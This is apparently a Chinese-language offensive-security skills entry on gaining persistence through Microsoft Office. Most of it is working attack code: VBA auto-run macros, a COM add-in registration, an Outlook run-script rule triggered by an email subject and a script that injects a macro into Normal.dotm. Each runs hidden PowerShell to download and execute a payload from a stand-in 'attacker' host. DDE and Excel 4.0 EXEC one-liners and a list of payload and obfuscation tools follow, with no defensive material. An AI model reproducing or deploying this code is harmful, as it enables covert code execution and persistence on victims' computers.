---
id: 07-004
title: "Office应用程序持久化 (Office Application Persistence)"
category: 持久化
category_en: Persistence
difficulty: ★★★★
tools: "Office, VBA, COM, Outlook, Add-in"
last_updated: 2026-05
tags: ["persistence", "bootkit", "startup-autostart", "account-persistence"]
subdomain: persistence
nist_csf: ["PR.AC-01", "DE.CM-01"]
mitre_attack: ["T1543", "T1547", "T1136", "T1053"]
---
# Office应用程序持久化 (Office Application Persistence)

## 概述

Microsoft Office 应用程序提供了丰富的扩展机制，包括 COM 加载项、VBA 宏、Outlook 规则和表单等。攻击者可利用这些功能在 Office 程序启动时自动执行恶意代码，隐蔽性强且难以检测。

## 核心技能

### 1. Office 加载项持久化

```vba
' Word/Excel 全局加载项 (Global Add-in)
' 文件位置:
'   %APPDATA%\Microsoft\Word\STARTUP\
'   %APPDATA%\Microsoft\Excel\XLSTART\

' 创建恶意 VBA 加载项
' 1. 在 Word 中创建 .dotm 模板
' 2. 添加 AutoExec 或 AutoOpen 宏
' 3. 保存到 STARTUP 文件夹

Private Sub Document_Open()
    ' 每次打开文档时执行
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell.exe -WindowStyle Hidden -Exec Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')""", 0, False
End Sub

Private Sub AutoExec()
    ' Word 启动时自动执行
    RunPayload
End Sub
```

### 2. COM 劫持与加载项

```powershell
# COM 加载项注册表位置
# HKCU\Software\Microsoft\Office\<Version>\<App>\Addins\
# HKLM\Software\Microsoft\Office\<Version>\<App>\Addins\

# 注册恶意 COM 加载项
$addinPath = "HKCU:\Software\Microsoft\Office\16.0\Word\Addins\MaliciousAddin"
New-Item -Path $addinPath -Force | Out-Null
New-ItemProperty -Path $addinPath -Name "Manifest" -Value "C:\Users\Public\addin.dll" -PropertyType String
New-ItemProperty -Path $addinPath -Name "LoadBehavior" -Value 3 -PropertyType DWord  # Auto-load
New-ItemProperty -Path $addinPath -Name "FriendlyName" -Value "Office Helper Add-in" -PropertyType String
New-ItemProperty -Path $addinPath -Name "Description" -Value "Provides enhanced Office functionality"

# 对应恶意 DLL 代码 (C++):
# #include <windows.h>
# STDAPI DllRegisterServer() { return S_OK; }
# STDAPI DllUnregisterServer() { return S_OK; }
# 
# BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
#     if (reason == DLL_PROCESS_ATTACH)
#         system("powershell -W Hidden -enc BASE64_ENCODED_PAYLOAD");
#     return TRUE;
# }
```

### 3. Outlook 规则与表单持久化

```powershell
# Outlook 规则持久化 — 读取邮件时触发
# 创建一条规则: 收到特定邮件时运行脚本
$outlook = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules = $namespace.DefaultStore.GetRules()

$rule = $rules.Create("SecurityUpdate", [Microsoft.Office.Interop.Outlook.OlRuleType]::olRuleReceive)
$rule.Conditions.Subject.ConditionText = @("!update")
$rule.Conditions.Subject.Enabled = $true

# 操作: 运行脚本
$action = $rule.Actions.Item([Microsoft.Office.Interop.Outlook.OlActionType]::olActionRunScript)
$action.Script = "Shell(""powershell -WindowStyle Hidden -Command """"IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"""""")"
$action.Enabled = $true
$rules.Save()

# Outlook 表单持久化
# 将恶意代码嵌入自定义表单页
# 位置: %APPDATA%\Microsoft\Forms\
```

### 4. Office 模板注入

```powershell
# 全局模板 (Normal.dotm) 持久化
# Word 启动时自动加载 Normal.dotm

# 使用 PowerShell 向 Normal.dotm 注入宏
$word = New-Object -ComObject Word.Application
$word.Visible = $false
$normal = $word.NormalTemplate
$vbComp = $normal.VBProject.VBComponents.Add(1)  # vbext_ct_StdModule
$code = @'
Sub AutoOpen()
    Shell "powershell -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')""", 0
End Sub
Sub AutoExec()
    AutoOpen
End Sub
'@
$vbComp.CodeModule.AddFromString($code)
$normal.Save()
$word.Quit()
```

### 5. Office 漏洞利用持久化

```vba
' EQNEDT32.EXE 持久化 (CVE-2017-11882)
' 利用 Equation Editor COM 对象加载恶意 DLL

' DDE 命令执行 (无需启用宏)
' 在 Word 中插入域代码:
' { DDE "cmd.exe" "/c powershell -W Hidden -enc BASE64" }

' Excel 4.0 宏 (XLM) 持久化
' =EXEC("powershell -WindowStyle Hidden -Command ""...""")
' =HALT()
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Office Macro Tools | VBA 宏分析与生成 | https://github.com/outflanknl/EvilClippy |
| macro_pack | Office 文档打包工具 | https://github.com/sevagas/macro_pack |
| LuckyStrike | Exchange/Outlook 利用 | https://github.com/curi0usJack/luckystrike |
| SharpShooter | Office Payload 生成 | https://github.com/mdsecactivebreach/SharpShooter |
| VBad | VBA 混淆工具 | https://github.com/Pepitoh/VBad |

## 参考资源

- [MITRE ATT&CK — Office Application Startup (T1137)](https://attack.mitre.org/techniques/T1137/)
- [MITRE ATT&CK — COM Hijacking (T1546.015)](https://attack.mitre.org/techniques/T1546/015/)
- [Outlook Home Page — Microsoft Docs](https://learn.microsoft.com/office/client-developer/outlook/)
- [VBA Macro Security Bypass Techniques](https://outflank.nl/blog/2018/10/06/evilclippy/)
